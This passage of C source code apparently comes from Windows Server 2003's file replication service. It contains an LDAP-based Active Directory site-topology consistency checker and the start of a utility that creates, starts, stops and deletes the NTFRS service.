	)
/*++
Routine Description:
	Allocate space for a table entry. The entry includes the user-defined
	struct and some overhead used by the generic table routines. The
	generic table routines call this function when they need memory.

Arguments:
	Table		- Address of the table (not used).
	ByteSize	- Bytes to allocate

Return Value:
	Address of newly allocated memory.
--*/
{
	return (PVOID)malloc(ByteSize);
}

VOID
RtlServerFree(
	PRTL_GENERIC_TABLE Table,
	PVOID Buffer
	)
/*++
Routine Description:
	Free the space allocated by RtlServerAllocate(). The generic table
	routines call this function to free memory.

Arguments:
	Table	- Address of the table (not used).
	Buffer	- Address of previously allocated memory

Return Value:
	None.
--*/
{
	free(Buffer);
}

VOID
RtlServerInsert(
	PSERVER Server
	)
/*++
Routine Description:
	Insert a server's name into the table. The new entry in the table
	will point to the originating SERVER. If this name is already in the
	table, then link the new entry off of the old entry.

Arguments:
	Server	- Address of SERVER

Return Value:
	None.
--*/
{
	PRTLSERVER	NewServer;		// Newly allocated table entry
	PRTLSERVER	OldServer;		// Existing entry in the table
	BOOLEAN		NewElement;		// TRUE if insert found existing entry

	// Allocate a new table entry
	NewServer = (PRTLSERVER)malloc(sizeof (*NewServer));
	NewServer->RtlServer = Server;
	NewServer->RtlServerDups = NULL;

	// Insert the entry
	OldServer = (PRTLSERVER)RtlInsertElementGenericTable(
								&ServerTable,
								(PVOID)NewServer,
								sizeof (*NewServer),
								&NewElement);
	// NewServer was copied into the table
	if (NewElement == TRUE) { 
		free(NewServer);
	} else {
		// Entry exists; link NewServer to existing entry
		NewServer->RtlServerDups = OldServer->RtlServerDups;
		OldServer->RtlServerDups = NewServer;
	}
}
PSERVER
RtlServerLookup(
	PTCHAR ServerRDN
	)
/*++
Routine Description:
	Find an entry in the table with the specified name.

Arguments:
	Server	- Address of SERVER

Return Value:
	The address of the SERVER with a matching name or NULL if no
	match was found.
--*/
{
	PRTLSERVER	FoundRtlServer;	// Address of matching table entry
	SERVER		Server;			// Part of the search key
	RTLSERVER	RtlServer;		// Search key
	
	// Set up the search key
	Server.ServerRDN = ServerRDN;
	RtlServer.RtlServer = &Server;

	// Search the table
	FoundRtlServer = (PRTLSERVER)RtlLookupElementGenericTable(&ServerTable, &RtlServer);
	if (FoundRtlServer != NULL)
		return FoundRtlServer->RtlServer;
	return NULL;
}

VOID
FreeRtlServer()
/*++
Routine Description:
	Free every entry in the generic table.

Arguments:
	None.

Return Value:
	None.
--*/
{
	PRTLSERVER	RtlServer;	// Next entry in table
	PRTLSERVER	Dups;		// scan the entries list of dups
	PRTLSERVER	NextDups;	// copy of freed Dups->RtlServerDups

	// For every entry in the table
	for (RtlServer = (PRTLSERVER)RtlEnumerateGenericTable(&ServerTable, TRUE);
		 RtlServer != NULL;
		 RtlServer = (PRTLSERVER)RtlEnumerateGenericTable(&ServerTable, TRUE)) {

		// Free the dups
		for (Dups = RtlServer->RtlServerDups; Dups; Dups = NextDups) {
			NextDups = Dups->RtlServerDups;
			free(Dups);
		}

		// Delete the entry from the table
		RtlDeleteElementGenericTable(&ServerTable, RtlServer);
	}

	// Didn't get all of them?
	if (!RtlIsGenericTableEmpty(&ServerTable)) {
		fprintf(stderr, "****** FreeRtlServer: Server Table is not empty\n");
	}
}

PLDAP
FrsDsOpenDs()
/*++
Routine Description:
	Open and bind to the a primary domain controller.

Arguments:
	None.

Return Value:
	The address of a open, bound LDAP port or NULL if the operation was
	unsuccessful. The caller must free the structure with ldap_unbind().
--*/
{
	PLDAP						ldap;
	LONG						Err;			// Generic error
	PDOMAIN_CONTROLLER_INFO		DCInfo = NULL;	// Domain Controller Info
    ULONG                       ulOptions;

	//
	// Get Info about a Primary Domain Controller (just need the IP address)
	//
	Err = DsGetDcName(
		NULL,								// Computer to remote to
		NULL,								// Domain - use our own
		NULL,								// Domain Guid
		NULL,								// Site Guid
		DS_DIRECTORY_SERVICE_REQUIRED |  	// Flags
			DS_PDC_REQUIRED,
		&DCInfo);							// Return info

	if (Err != ERROR_SUCCESS) {
		fprintf(stderr, "DsGetDcName returned error %d\n", Err);
		fprintf(stderr, "Could not find a Primary Domain Controller\n");
		return NULL;
	}

	//
	// Open and bind to the ldap service (TCP/IP)
	//		The IP address has a leading "\\" that ldap_open can't handle
	//
    //
    // if ldap_open is called with a server name the api will call DsGetDcName 
    // passing the server name as the domainname parm...bad, because 
    // DsGetDcName will make a load of DNS queries based on the server name, 
    // it is designed to construct these queries from a domain name...so all 
    // these queries will be bogus, meaning they will waste network bandwidth,
    // time to fail, and worst case cause expensive on demand links to come up 
    // as referrals/forwarders are contacted to attempt to resolve the bogus 
    // names.  By setting LDAP_OPT_AREC_EXCLUSIVE to on using ldap_set_option 
    // after the ldap_init but before any other operation using the ldap 
    // handle from ldap_init, the delayed connection setup will not call 
    // DsGetDcName, just gethostbyname, or if an IP is passed, the ldap client 
    // will detect that and use the address directly.
    //
//	ldap = ldap_open(&DCInfo->DomainControllerAddress[2], LDAP_PORT);
	ldap = ldap_init(&DCInfo->DomainControllerAddress[2], LDAP_PORT);

	if (ldap == NULL) {
		fprintf(stderr, "ldap_open: Could not open %ws\n", 
						&DCInfo->DomainControllerAddress[2]);
		return NULL;
	}

    //
    // set the options.
    //

    ulOptions = PtrToUlong(LDAP_OPT_ON);
    ldap_set_option(ldap, LDAP_OPT_AREC_EXCLUSIVE, &ulOptions);

	//
	// ldap cannot be used until after the bind operation
	//
	Err = ldap_bind_s(ldap, NULL, NULL, LDAP_AUTH_SSPI);
	if (Err != LDAP_SUCCESS) {
		fprintf(stderr, "ldap_bind_s: %ws\n", ldap_err2string(Err));
		ldap_unbind(ldap);	// XXX Is this necessary?  Will this free ldap?
		return NULL;
	}

	return ldap;
}

PTCHAR *
GetValues(
	IN PLDAP ldap,
	IN PTCHAR Base,
	IN PTCHAR DesiredAttr
	)
/*++
Routine Description:
	Return the DS values for one attribute in an object.

Arguments:
	ldap 		- An open, bound ldap port.
	Base		- The "pathname" of a DS object.
	DesiredAttr	- Return values for this attribute.

Return Value:
	An array of char pointers that represents the values for the attribute.
	The caller must free the array with ldap_value_free(). NULL if unsuccessful.
--*/
{
	LONG			Err;		// Generic error
	PTCHAR			Attr;		// Retrieved from an ldap entry
	BerElement		*Ber;		// Needed for scanning attributes
	PLDAPMessage	Msg = NULL;	// Opaque stuff from ldap subsystem 
	PLDAPMessage	Entry;		// Opaque stuff from ldap subsystem 
	PTCHAR			*Values;	// Array of values for desired attribute
	PTCHAR			Attrs[2];	// Needed for the query

	//
	// Search Base for all of this attribute + values
	//
	Attrs[0] = DesiredAttr;
	Attrs[1] = NULL;
	Err = ldap_search_s(ldap, Base, LDAP_SCOPE_BASE,
				TEXT("(objectClass=*)"), Attrs, 0, &Msg);
	if (Err != LDAP_SUCCESS) {
		fprintf(stderr, "ldap_search_s: %ws: %ws\n", DesiredAttr, ldap_err2string(Err));
        if (Msg) {
	        ldap_msgfree(Msg);
        }
		return NULL;
	}
	Entry = ldap_first_entry(ldap, Msg);
	Attr = ldap_first_attribute(ldap, Entry, &Ber);
	Values = ldap_get_values(ldap, Entry, Attr);
	ldap_msgfree(Msg);
	return Values;
}

PTCHAR
MakeRDN(
	PTCHAR DN
	)
/*++
Routine Description:
	Extract the base component from a distinguished name. The distinguished
	name is assumed to be in DS format (CN=xyz,CN=next one,...)

Arguments:
	DN	- distinguished name

Return Value:
	The address of a base name. The caller must free the memory with free().
--*/
{
	LONG	RDNLen;
	PTCHAR	RDN;

	// Skip the first CN=; if any
	RDN = _tcsstr(DN, TEXT("CN="));
	if (RDN == DN)
		DN += 3;
	
	// Return the string up to the first delimiter
	RDNLen = _tcscspn(DN, TEXT(","));
	RDN = (PTCHAR)malloc(sizeof (TCHAR) * (RDNLen + 1));
	_tcsncpy(RDN, DN, RDNLen);
	RDN[RDNLen] = TEXT('\0');

	return RDN;
}


VOID
GetTree(
	IN PLDAP 	ldap,
	IN PTCHAR 	Base,
	IN LONG		What,
	IN PVOID	Parent,
	IN PTCHAR	Filter
	)
/*++
Routine Description:
	Recursively scan the DS tree beginning at configuration\sites.
Arguments:
	ldap	- opened and bound ldap connection
	Base	- Name of object or container in DS
	What	- Where are we in the DS hierarchy?
	Parent	- Container which contains Base
	Filter	- Limits ldap search to these object classes
Return Value:
	None.
--*/
{
	LONG			Err;		// Generic error
	PLDAPMessage	Msg = NULL;	// Opaque stuff from ldap subsystem 
	PLDAPMessage	Entry;		// Opaque stuff from ldap subsystem 
	PTCHAR			DirName;	// DS name of this object
	PTCHAR			RDN;		// base name derived from DirName
	PTCHAR			*Values;	// entries for this container
	PSITE			Site;		// copy DS site entries into this struct
	PSETTINGS		Settings;	// copy DS settings entries into this struct
	PSERVER			Server;		// copy DS server entries into this struct
	PCXTION			Cxtion;		// copy DS connection entries into this struct

	//
	// Search the DS beginning at Base for the entries of class "Filter" 
	//
	Err = ldap_search_s(ldap, Base, LDAP_SCOPE_ONELEVEL, Filter, NULL, 0, &Msg);
	if (Err != LDAP_SUCCESS) {
        if (Msg) {
	        ldap_msgfree(Msg);
        }
		return;
    }
	//
	// Scan the entries returned from ldap_search
	//
	for (
		Entry = ldap_first_entry(ldap, Msg);
		Entry != NULL;
		Entry = ldap_next_entry(ldap, Entry)) {

			// DS pathname of this entry
			DirName = ldap_get_dn(ldap, Entry);
			if (DirName == NULL)
				continue;
			// base name of the DS pathname
			RDN = MakeRDN(DirName);

			// Where are we in the DS directory hierarchy
			switch (What) {
			case SITES:
				// Copy a site entry into our tree
				Site = (PSITE)malloc(sizeof (*Site));
				Site->SiteRDN = RDN;
				Site->SiteSettings = NULL;
				Site->SiteNext = Sites;
				Sites = Site;
				// Get the settings
				GetTree(ldap, DirName, SETTINGZ, (PVOID)Site, TEXT("(objectClass=nTDSSettings)"));
				break;
			case SETTINGZ:
				// Copy a settings entry into our tree
				Settings = (PSETTINGS)malloc(sizeof (*Settings));
				Settings->SettingsRDN = RDN;
				Settings->SettingsServers = NULL;
				Settings->SettingsSite = (PSITE)Parent;
				Settings->SettingsNext = ((PSITE)Parent)->SiteSettings;
				((PSITE)Parent)->SiteSettings = Settings;
				// Get the servers
				GetTree(ldap, DirName, SERVERS, (PVOID)Settings, TEXT("(objectClass=mSFTDSA)"));
				break;
			case SERVERS:
				// Copy a server entry into our tree
				Server = (PSERVER)malloc(sizeof (*Server));
				Server->ServerRDN = RDN;
				Server->ServerSettings = (PSETTINGS)Parent;
				Server->ServerIns = NULL;
				Server->ServerOuts = NULL;
				Server->ServerNext = ((PSETTINGS)Parent)->SettingsServers;
				((PSETTINGS)Parent)->SettingsServers = Server;
				// Put this server into the generic table
				RtlServerInsert(Server);
				// Get the connections
				GetTree(ldap, DirName, CXTIONS, (PVOID)Server, TEXT("(objectClass=nTDSConnection)"));
				break;
			case CXTIONS:
				// Copy a connection entry into our tree
				Cxtion = (PCXTION)malloc(sizeof (*Cxtion));
				Cxtion->CxtionRDN = RDN;
				Cxtion->CxtionServer = (PSERVER)Parent;
				Cxtion->CxtionPartner = NULL;
				Cxtion->CxtionNext = ((PSERVER)Parent)->ServerIns;
				((PSERVER)Parent)->ServerIns = Cxtion;
				Values = GetValues(ldap, DirName, TEXT("fromServer"));
				// Get the inbound partner's name
				if (Values != NULL) {
					Cxtion->CxtionPartner = MakeRDN(Values[0]);
					ldap_value_free(Values);
				}
				break;
			default:;
			}
			free(DirName);
		}
	ldap_msgfree(Msg);
}

VOID
FrsDsFreeTree(
	)
/*++
Routine Description:
	Frees our copy of the DS tree.

Arguments:
	None.

Return Value:
	None.
--*/
{
	PSITE		Site;		// Scan the sites
	PSETTINGS	Settings;	// Scan the settings
	PSERVER		Server;		// Scan the servers
	PCXTION		Cxtion;		// Scan the connections

	//
	// For every site
	//
	while ((Site = Sites) != NULL) {
		Sites = Site->SiteNext;
		//
		// For every settings
		//
		while ((Settings = Site->SiteSettings) != NULL) {
			Site->SiteSettings = Settings->SettingsNext;
			//
			// For every server
			//
			while ((Server = Settings->SettingsServers) != NULL) {
				Settings->SettingsServers = Server->ServerNext;
				//
				// For every inbound connection
				//
				while ((Cxtion = Server->ServerIns) != NULL) {
					Server->ServerIns = Cxtion->CxtionNext;
					// Free inbound connection
					free(Cxtion->CxtionRDN);
					free(Cxtion->CxtionPartner);
					free(Cxtion);
				}
				//
				// For every outbound connection
				//
				while ((Cxtion = Server->ServerOuts) != NULL) {
					Server->ServerOuts = Cxtion->CxtionNext;
					// Free outbound connection
					free(Cxtion->CxtionRDN);
					free(Cxtion->CxtionPartner);
					free(Cxtion);
				}
				// Free server
				free(Server->ServerRDN);
				free(Server);
			}
			// Free settings
			free(Settings->SettingsRDN);
			free(Settings);
		}
		// Free site
		free(Site->SiteRDN);
		free(Site);
	}
}

VOID
CreateOutBoundPartners(
	)
/*++
Routine Description:
	Scan our copy of the DS tree. For each server, use the generic
	table to find its outbound partners. Update the server's list
	of outbound connections.

Arguments:
	None.

Return Value:
	None.
--*/
{
	PSITE		Site;			// Scan the sites
	PSETTINGS	Settings;		// Scan the settings
	PSERVER		Server;			// Scan the servers
	PCXTION		Cxtion;			// Scan the inbound connections
	PSERVER		InServer;		// My inbound partner
	PCXTION		InCxtion;		// outbound connection added to my inbound partner
	PRTLSERVER	InRtlServer;	// Inbound partner from generic table

	//
	// For every site
	//
	for (Site = Sites;
		 Site != NULL;
		 Site = Site->SiteNext) {
		//
		// For every setting
		//
		for (
			Settings = Site->SiteSettings;
			Settings != NULL;
			Settings = Settings->SettingsNext) {
			//
			// For every server
			//
			for (Server = Settings->SettingsServers;
				 Server != NULL;
				 Server = Server->ServerNext) {
				//
				// For every inbound connection
				//
				for (Cxtion = Server->ServerIns;
					 Cxtion != NULL;
					 Cxtion = Cxtion->CxtionNext) {
					//
					// Find one of our inbound partners and put a copy of
					// this inbound connection on his list of outbound
					// connections after filling in the "partner" field
					// with this server's name.  Basically, create the
					// outbound connections from the inbound connections.
					//

					// Find the inbound partner in the generic table
					InServer = RtlServerLookup(Cxtion->CxtionPartner);
					if (InServer == NULL)
						continue;

					//
					// Dummy up a outbound connection and put it on
					// our inbound partner's list of outbound connections.
					//
					InCxtion = (PCXTION)malloc(sizeof (*InCxtion));
					InCxtion->CxtionRDN = _tcsdup(Cxtion->CxtionRDN);
					InCxtion->CxtionServer = InServer;
					InCxtion->CxtionPartner = _tcsdup(Server->ServerRDN);
					InCxtion->CxtionNext = InServer->ServerOuts;
					InServer->ServerOuts = InCxtion;
				}
			}
		}
	}
}

PTCHAR
GetRoot(
	IN PLDAP ldap
	)
/*++
Routine Description:
	Return the DS pathname of the configuration\sites container.

Arguments:
	ldap	- An open, bound ldap port.

Return Value:
	A malloc'ed string representing the DS pathname of the
	configuration\sites container. Or NULL if the container could
	not be accessed. The caller must free() the string.
--*/
{
	PTCHAR			Config;		// DS pathname of configuration
	PTCHAR			Root;		// DS pathname of configuration\sites
	PTCHAR			*Values;	// values from the attribute "namingContexts"
	LONG			NumVals;	// number of values

	//
	// Search Base for the attribute "namingContext"
	//
	Values = GetValues(ldap, TEXT(""), TEXT("namingContexts"));
	if (Values == NULL)
		return NULL;

	//
	// Find the naming context that begins with "CN=configuration"
	//
	NumVals = ldap_count_values(Values);
	while (NumVals--) {
		Config = _tcsstr(Values[NumVals], TEXT("CN=configuration"));
		if (Config != NULL && Config == Values[NumVals]) {
			//
			// Build the pathname for "configuration\sites"
			//
			Root = (PTCHAR)malloc(
					sizeof (TCHAR) * _tcslen(Config) +
					sizeof (TCHAR) * (_tcslen(TEXT("CN=sites,")) + 1));
			_tcscpy(Root, TEXT("CN=sites,"));
			_tcscat(Root, Config);
			ldap_value_free(Values);
			return Root;
		}
	}
	ldap_value_free(Values);
	return NULL;
}

VOID
FrsDsCheckTree(
	)
/*++
Routine Description:
	Scan our copy of the DS tree and check the consistency of sites and
	settings. XXX we need a list of checks here.

Arguments:
	None.

Return Value:
	None.
--*/
{
	PSITE		Site;		// Scan the sites
	PSETTINGS	Settings;	// Scan the settings

	//
	// No sites
	//
	if (Sites == NULL) {
		fprintf(stderr, "There are no sites\n");
		return;
	}

	//
	// For every site
	//
	for (Site = Sites;
		 Site != NULL;
		 Site = Site->SiteNext) {
		// No Settings
		if (Site->SiteSettings == NULL) {
			fprintf(stderr, "%ws has no NTDS Settings\n", Site->SiteRDN);
		} else {
		// More than one settings
			if (Site->SiteSettings->SettingsNext != NULL) {
				fprintf(stderr, "%ws has more than one NTDS Settings\n", Site->SiteRDN);
				// List the extra settings
				for (Settings = Site->SiteSettings;
					 Settings != NULL;
					 Settings = Settings->SettingsNext)
					fprintf(stderr, "\t%ws\n", Settings->SettingsRDN);
			}
		}
		//
		// For every settings
		//
		for (Settings = Site->SiteSettings;
			 Settings != NULL;
			 Settings = Settings->SettingsNext) {
			// No servers
			if (Settings->SettingsServers == NULL) {
				fprintf(stderr, "%ws has no servers\n", Settings->SettingsRDN);
			}
		}
	}
}
VOID
CheckServers(
	)
/*++
Routine Description:
	Scan the generic table of servers and check the consistency of servers
	and connections. XXX we need a list of checks here.

Arguments:
	None.

Return Value:
	None.
--*/
{
	PVOID		RestartKey;	// Needed for scanning the table
	PSERVER		Server;		// Address of SERVER in copy of DS tree
	PCXTION		Cxtion;		// Address of CXTION in copy of DS tree
	PRTLSERVER	RtlServer;	// Returned by table routines
	PRTLSERVER	Dups;		// Duplicate servers

	//
	// Scan the generic table of servers. Every server is only listed once.
	//
	RestartKey = NULL;
    for (RtlServer = (PRTLSERVER)RtlEnumerateGenericTableWithoutSplaying(&ServerTable, &RestartKey);
         RtlServer != NULL;
         RtlServer = (PRTLSERVER)RtlEnumerateGenericTableWithoutSplaying(&ServerTable, &RestartKey)) {

		//
		// The same server name in multiple sites is not allowed
		//
		if (RtlServer->RtlServerDups != NULL) {
			fprintf(stderr, "%ws is a member of multiple sites\n", RtlServer->RtlServer->ServerRDN);
			fprintf(stderr, "\t%ws\n", RtlServer->RtlServer->ServerSettings->SettingsSite->SiteRDN);
			for (Dups = RtlServer->RtlServerDups; Dups; Dups = Dups->RtlServerDups)
				fprintf(stderr, "\t%ws\n", Dups->RtlServer->ServerSettings->SettingsSite->SiteRDN);
		}
		Server = RtlServer->RtlServer;
		// No inbound connections
		if (Server->ServerIns == NULL)
			fprintf(stderr, "%ws has no inbound connections\n", Server->ServerRDN);
		//
		// For every inbound connection
		//
		for (Cxtion = Server->ServerIns;
			 Cxtion != NULL;
			 Cxtion = Cxtion->CxtionNext) {
			// Connection doesn't have the partner's name
			if (Cxtion->CxtionPartner == NULL)
				fprintf(stderr, "%ws has no inbound server\n", Cxtion->CxtionRDN);
			// Replicating from ourselves is not allowed
			if (_tcscmp(Cxtion->CxtionPartner, Server->ServerRDN) == 0)
				fprintf(stderr, "%ws is its own inbound partner\n", Server->ServerRDN);
		}
		// No outbound connections
		if (Server->ServerOuts == NULL)
			fprintf(stderr, "%ws has no outbound connections\n", Server->ServerRDN);
		//
		// For every outbound connection
		//
		for (Cxtion = Server->ServerOuts;
			 Cxtion != NULL;
			 Cxtion = Cxtion->CxtionNext) {
			// Connection doesn't have the partner's name
			if (Cxtion->CxtionPartner == NULL)
				fprintf(stderr, "%ws has no outbound server\n", Cxtion->CxtionRDN);
			// Replicating to ourselves is not allowed
			if (_tcscmp(Cxtion->CxtionPartner, Server->ServerRDN) == 0)
				fprintf(stderr, "%ws is its own outbound partner\n", Server->ServerRDN);
		}
	}
}

VOID _cdecl
main(
	IN LONG		argc,
	IN PTCHAR	*argv
	)
/*++
Routine Description:
	Open a connection to the DS and copy the DS tree beginning at
	configuration\sites. Check the resulting topology for consistency.
	The generic table routines are used to avoid N**2 algorithms during
	the consistency checks.

Arguments:
	None.

Return Value:
	exit 0	- No errors
	exit 1	- Something went wrong
--*/
{
	PLDAP	ldap	= NULL;		// ldap connection
	PTCHAR	Root	= NULL;		// DS pathname to ...\configuration\sites
	
	//
	// Open and bind a ldap connection to the DS
	//
	ldap = FrsDsOpenDs();
	if (ldap == NULL)
		exit(1);

	//
	// Get the DS pathname down to ...\configuration\sites
	//
	Root = GetRoot(ldap);	
	if (Root == NULL)
		goto out;

	//
	// Create incore copy of the complete DS topology
	//

	// This generic table keeps additional info about the servers
	RtlInitializeGenericTable(&ServerTable, RtlServerCompare,
							  RtlServerAllocate, RtlServerFree, NULL);
	// Create copy of the DS tree
	GetTree(ldap, Root, SITES, NULL, TEXT("(objectClass=site)"));
	// The DS doesn't have connections for outbound partners; create them
	CreateOutBoundPartners();

	//
	// Check consistency
	//
	FrsDsCheckTree();		// check incore copy of DS tree
	CheckServers();		// check generic table of servers


out:
	//
	// Cleanup
	//
	if (Sites != NULL) {
		FreeRtlServer();	// generic table of servers
		FrsDsFreeTree();			// copy of DS tree
	}
	if (Root != NULL)
		free(Root);			// DS pathname to ...\configuration\sites
	if (ldap != NULL)  
		ldap_unbind(ldap);	// release the connection to the DS
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\setup\service\service.c ===
/*++

Copyright (c) 1997 Microsoft Corporation

Module Name:
    addsrvc.c

Abstract:
    Create the file replication service (ntfrs):
        addsrvc <full path to exe>

Author:
    Billy J. Fuller 2-Sep-1997

Environment
    User mode winnt

--*/

#include <windows.h>
#include <string.h>
#include <winsvc.h>
#include <stdio.h>
#include <config.h>
#include <malloc.h>

//
// Lower case
//
#define FRS_WCSLWR(_s_) \
{ \
    if (_s_) { \
        _wcslwr(_s_); \
    } \
}


SC_HANDLE
OpenServiceHandle(
    IN PWCHAR  ServiceName
    )
/*++
Routine Description:
    Open a service on a machine.

Arguments:
    ServiceName - the service to open

Return Value:
    The service's handle or NULL.
--*/
{
    SC_HANDLE       SCMHandle;
    SC_HANDLE       ServiceHandle;

    //
    // Attempt to contact the SC manager.
    //
    SCMHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (SCMHandle == NULL) {
        printf("Couldn't open service control manager; error %d\n",
               GetLastError());
        return NULL;
    }

    //
    // Contact the service.
    //
    ServiceHandle = OpenService(SCMHandle, ServiceName, SERVICE_ALL_ACCESS);
    CloseServiceHandle(SCMHandle);
    return ServiceHandle;
}


DWORD
FrsGetServiceState(
    IN PWCHAR   ServiceName
    )
/*++
Routine Description:
    Return the service's state

Arguments:
    ServiceName - the service to check

Return Value:
    The service's state or 0 if the state could not be obtained.
--*/
{
    BOOL            Status;
    SC_HANDLE       ServiceHandle;
    SERVICE_STATUS  ServiceStatus;

    //
    // Open the service.
    //
    ServiceHandle = OpenServiceHandle(ServiceName);
    if (ServiceHandle == NULL)
        return 0;

    //
    // Get the service's status
    //
    if (!ControlService(ServiceHandle,
                        SERVICE_CONTROL_INTERROGATE,
                        &ServiceStatus)) {
        CloseServiceHandle(ServiceHandle);
        return GetLastError();
    }
    return ServiceStatus.dwCurrentState;
}


VOID
FrsWaitServicePending(
    IN PWCHAR   ServiceName,
    IN ULONG    IntervalMS,
    IN ULONG    TotalMS
    )
/*++
Routine Description:
    Wait for a service to leave any "pending" state. Check every so often,
    up to a maximum time.

Arguments:
    ServiceName     - Name of the NT service to interrogate.
    IntervalMS      - Check every IntervalMS milliseconds.
    TotalMS         - Stop checking after this long.

Return Value:
    TRUE    - Service is not in a pending state
    FALSE   - Service is still in a pending state
--*/
{
    DWORD   State;

    do {
        State = FrsGetServiceState(ServiceName);
        if (State == 0)
            return;
        switch (State) {
            case ERROR_IO_PENDING:
                printf("IO is pending for %ws; waiting\n", ServiceName);
                break;
            case SERVICE_START_PENDING:
                printf("Start is pending for %ws; waiting\n", ServiceName);
                break;
            case SERVICE_STOP_PENDING:
                printf("Stop is pending for %ws; waiting\n", ServiceName);
                break;
            case SERVICE_CONTINUE_PENDING:
                printf("Continue is pending for %ws; waiting\n", ServiceName);
                break;
            case SERVICE_PAUSE_PENDING:
                printf("Pause is pending for %ws; waiting\n", ServiceName);
                break;
            default:;
                return;
        }
        Sleep(IntervalMS);
    } while ((TotalMS -= IntervalMS) > 0);
}


VOID
FrsStartService(
    IN PWCHAR   ServiceName
    )
/*++
Routine Description:
    Start a service on a machine.

Arguments:
    ServiceName - the service to start

Return Value:
    None.
--*/
{
    SC_HANDLE   ServiceHandle;

    //
    // Open the service.
    //
    ServiceHandle = OpenServiceHandle(ServiceName);
    if (ServiceHandle == NULL) {
        printf("Couldn't open %ws\n", ServiceName);
        return;
    }
    //
    // Start the service
    //
    if (!StartService(ServiceHandle, 0, NULL)) {
        printf("Couldn't start %ws; error %d\n",
               ServiceName, GetLastError());
        CloseServiceHandle(ServiceHandle);
        return;
    }
    CloseServiceHandle(ServiceHandle);
    printf("Started %ws\n", ServiceName);
}


VOID
FrsStopService(
    IN PWCHAR  ServiceName
    )
/*++
Routine Description:
    Stop a service on a machine.

Arguments:
    ServiceName - the service to stop

Return Value:
    None.
--*/
{
    BOOL            Status;
    SC_HANDLE       ServiceHandle;
    SERVICE_STATUS  ServiceStatus;

    //
    // Open the service.
    //
    ServiceHandle = OpenServiceHandle(ServiceName);
    if (ServiceHandle == NULL) {
        printf("Couldn't open %ws\n", ServiceName);
        return;
    }

    //
    // Stop the service
    //
    Status = ControlService(ServiceHandle, SERVICE_CONTROL_STOP, &ServiceStatus);
    if (!Status) {
        printf("Couldn't stop %ws; error %d\n",
               ServiceName, GetLastError());
        CloseServiceHandle(ServiceHandle);
        return;
    }
    CloseServiceHandle(ServiceHandle);
    printf("Stopped %ws\n", ServiceName);
}


VOID
FrsPauseService(
    IN PWCHAR  ServiceName
    )
/*++
Routine Description:
    Pause a service on a machine.

Arguments:
    ServiceName - the service to pause

Return Value:
    None.
--*/
{
    BOOL            Status;
    SC_HANDLE       ServiceHandle;
    SERVICE_STATUS  ServiceStatus;

    //
    // Open the service.
    //
    ServiceHandle = OpenServiceHandle(ServiceName);
    if (ServiceHandle == NULL) {
        printf("Couldn't open %ws\n", ServiceName);
        return;
    }

    //
    // Stop the service
    //
    Status = ControlService(ServiceHandle, SERVICE_CONTROL_PAUSE, &ServiceStatus);
    if (!Status) {
        printf("Couldn't pause %ws; error %d\n",
               ServiceName, GetLastError());
        CloseServiceHandle(ServiceHandle);
        return;
    }
    CloseServiceHandle(ServiceHandle);
    printf("Paused %ws\n", ServiceName);
}


VOID
FrsContinueService(
    IN PWCHAR  ServiceName
    )
/*++
Routine Description:
    Continue a service on a machine.

Arguments:
    ServiceName - the service to continue

Return Value:
    None.
--*/
{
    BOOL            Status;
    SC_HANDLE       ServiceHandle;
    SERVICE_STATUS  ServiceStatus;

    //
    // Open the service.
    //
    ServiceHandle = OpenServiceHandle(ServiceName);
    if (ServiceHandle == NULL) {
        printf("Couldn't open %ws\n", ServiceName);
        return;
    }

    //
    // Stop the service
    //
    Status = ControlService(ServiceHandle, SERVICE_CONTROL_CONTINUE, &ServiceStatus);
    if (!Status) {
        printf("Couldn't continue %ws; error %d\n",
               ServiceName, GetLastError());
        CloseServiceHandle(ServiceHandle);
        return;
    }
    CloseServiceHandle(ServiceHandle);
    printf("Continued %ws\n", ServiceName);
}



VOID
FrsDeleteService(
    IN PWCHAR ServiceName
    )
/*++
Routine Description:
    Delete a service on a machine.

Arguments:
    ServiceName - the service to delete

Return Value:
    None.
--*/
{
    SC_HANDLE       ServiceHandle;

    // FrsWaitServicePending(ServiceName, 5000, 20000);

    //
    // Open the service
    //
    ServiceHandle = OpenServiceHandle(ServiceName);
    if (ServiceHandle == NULL) {
        return;
    }

    //
    // Delete the service
    //
    if (!DeleteService(ServiceHandle) &&
        GetLastError() != ERROR_SERVICE_MARKED_FOR_DELETE) {
        printf("Couldn't delete %ws; error %d\n",
               ServiceName,
               GetLastError());
    }
    CloseServiceHandle(ServiceHandle);
    printf("Deleted %ws\n", ServiceName);
}


VOID
FrsCreateService(
    IN PWCHAR   ServiceName,
    IN PWCHAR   PathName,
    IN PWCHAR   DisplayName
    )
/*++
Routine Description:
    If the service doesn't exist on the machine, create it.

Arguments:
    ServiceName - the service to create
    PathName    - the path of the service's .exe
    DisplayName - the display name of the service

Return Value:
    TRUE    - Service was created (or already existed)
    FALSE   - Service was not created and didn't already exist
--*/
{
    SC_HANDLE       SCMHandle;
    SC_HANDLE       ServiceHandle;


    //
    // Attempt to contact the SC manager.
    //
    SCMHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (SCMHandle == NULL) {
        printf("Couldn't open service control manager; error %d\n",
               GetLastError());
        return;
    }

    //
    // Create the service
    //
    ServiceHandle = CreateService(
                        SCMHandle,
                        ServiceName,
                        DisplayName,
                        SERVICE_ALL_ACCESS,     // XXX is this right!!!
                        SERVICE_WIN32_OWN_PROCESS,
                        SERVICE_DEMAND_START,
                        SERVICE_ERROR_NORMAL,
                        PathName,
                        NULL,       // No load order group
                        NULL,       // No Tag Id required
                        L"eventlog\0rpcss\0",
                        NULL,
                        NULL);     // No password

    if (ServiceHandle == NULL) {
        FrsWaitServicePending(ServiceName, 5000, 20000);
        //
        // Create the service
        //
        ServiceHandle = CreateService(SCMHandle,
                                      ServiceName,
                                      DisplayName,
                                      SERVICE_ALL_ACCESS,
                                      SERVICE_WIN32_OWN_PROCESS,
                                      SERVICE_DEMAND_START,
                                      SERVICE_ERROR_NORMAL,
                                      PathName,
                                      NULL,
                                      NULL,
                                      L"eventlog\0rpcss\0",
                                      NULL,
                                      NULL);
    }
    CloseServiceHandle(SCMHandle);

    //
    // Couldn't create the service
    //
    if (ServiceHandle == NULL) {
        printf("Couldn't create %ws; error %d\n",
               ServiceName, GetLastError());
    } else {
        CloseServiceHandle(ServiceHandle);
        printf("Created %ws\n", ServiceName);
    }
}


PWCHAR *
ConvertArgv(
    DWORD argc,
    PCHAR *argv
    )
/*++
Routine Description:
    Convert short char argv into wide char argv

Arguments:
    argc    - From main
    argv    - From main

Return Value:
